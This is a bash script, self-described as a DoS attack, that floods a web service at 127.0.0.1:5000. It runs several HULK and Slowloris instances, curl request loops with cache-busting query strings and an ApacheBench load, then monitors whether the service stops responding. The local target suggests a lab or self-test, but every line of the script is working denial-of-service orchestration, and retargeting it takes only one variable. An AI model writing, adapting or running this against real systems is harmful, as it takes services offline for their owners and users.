#!/bin/bash

TARGET="127.0.0.1"
PORT=5000
HULK_INSTANCES=5
SLOWLORIS_INSTANCES=5

echo "Launching DoS attack on $TARGET:$PORT"

monitor_target() {
  while true; do
    curl -s -o /dev/null -w "Response time: %{time_total}s\n" http://$TARGET:$PORT || echo "Service unavailable!"
    sleep 2
  done
}

monitor_target &
MONITOR_PID=$!

for i in $(seq 1 $HULK_INSTANCES); do
  (cd hulk/ && python3 hulk.py http://$TARGET:$PORT -t 100) &
done

for i in $(seq 1 $SLOWLORIS_INSTANCES); do
  (cd slowloris/ && python3 slowloris.py $TARGET -p $PORT --sockets 200) &
done

for i in $(seq 1 5); do
  (while true; do curl -s -o /dev/null http://$TARGET:$PORT?$(date +%s%N); sleep 0.2; done) &
done

if command -v ab &> /dev/null; then
  ab -n 50000 -c 100 http://$TARGET:$PORT/ &
fi

echo "Press Ctrl+C to stop everything"

trap 'kill $MONITOR_PID; pkill -f hulk.py; pkill -f slowloris.py; pkill -f curl; pkill -f ab; echo "Attack stopped."' INT

wait
